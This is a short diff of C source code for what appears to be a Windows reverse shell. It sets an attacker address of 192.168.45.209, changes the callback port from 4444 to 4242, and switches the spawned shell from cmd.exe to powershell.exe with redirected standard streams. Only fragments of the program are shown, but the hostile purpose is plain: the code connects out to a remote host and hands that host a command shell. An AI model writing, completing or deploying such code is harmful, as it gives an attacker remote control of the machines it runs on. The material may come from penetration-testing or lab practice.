@@ -2,7 +2,7 @@
 #include <stdio.h>
 
 #define SERVER_IP "192.168.45.209"
-#define SERVER_PORT 4444
+#define SERVER_PORT 4242
 
 int main(int argc, char *argv[])
 {
@@ -36,7 +36,7 @@ int main(int argc, char *argv[])
             continue;
         }
 
-        // start cmd.exe with redirected streams
+        // start powershell.exe with redirected streams
         STARTUPINFOW si = {
             sizeof(si),
             .dwFlags = STARTF_USESTDHANDLES,
